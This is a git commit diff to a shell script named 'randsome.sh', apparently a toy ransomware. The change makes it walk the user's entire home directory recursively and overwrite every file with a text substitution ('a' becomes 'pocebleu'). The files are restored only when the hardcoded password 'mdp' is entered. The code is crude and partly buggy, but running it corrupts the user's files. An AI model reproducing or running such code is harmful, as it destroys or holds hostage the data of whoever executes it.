f9a6a5e4dfa04a328860b0850ccd7e8e67597d6d
Robin Solde <robin.solde@gmail.com>
2017-07-27 01:45:13 +0200

    seem to work just fine

--- randsome.sh
+++ randsome.sh
@@ -2,46 +2,79 @@
 
 crypt()
 {
- cat $i | sed 's/a/pocebleu/g' > $i.tmp
- cat $i.tmp > $i
- rm $i.tmp
+    cat $i | sed 's/a/pocebleu/g' > $i.tmp
+    cat $i.tmp > $i
+    rm $i.tmp
 
 }
 decrypt()
 {
- cat $i | sed 's/pocebleu/a/g' > $i.tmp
- cat $i.tmp > $i
- rm $i.tmp
+    cat $i | sed 's/pocebleu/a/g' > $i.tmp
+    cat $i.tmp > $i
+    rm $i.tmp
 
 }
+cryptfolder()
+{
+    for i in $(ls $1) 
+    do
+        if [ "$i" != "randsome.sh" ];
+        then
+            if ! [ -f $i ];
+            then 
+                #crypt $i
+                echo dossier $1/$i
+                cryptfolder $1/$i
+            else
+                echo "    fichier" $1/$i
+               crypt $i
+            fi
+        fi
+    done
+
+}
+decryptfolder()
+{
+    for i in $(ls $1) 
+    do
+        if [ "$i" != "randsome.sh" ];
+        then
+            if ! [ -f $i ];
+            then 
+                #crypt $i
+                echo dosier $1/$i
+                decryptfolder $1/$i
+            else
+                echo "    fichier" $1/$i
+               decrypt $i
+            fi
+        fi
+    done
+
+}
+
 init()
 {
     cat .pocebleu 2> /dev/null
     b=$?
-    if [ $b -eq 1 ]; then  
-        for i in $(ls -R ./) 
-        do
-            if [ "$i" != "randsome.sh" ];
-            then
-                crypt $i
-            fi
-        done
+    cd ~
+
+    if [ $b -eq 1 ];
+    then 
+        cryptfolder ~
+        cd -
         echo pocebleu > .pocebleu
     else
         read pb
         if [ "$pb" == "mdp" ];
         then
-            for i in $(ls -R ./) 
-            do
-                if [ "$i" != "randsome.sh" ];
-                then
-                    decrypt $i
-                fi
-            done
+            decryptfolder ~
             rm .pocebleu
         else
             echo "Wrong password"
         fi 
     fi
+
+
 }
-init
+init 
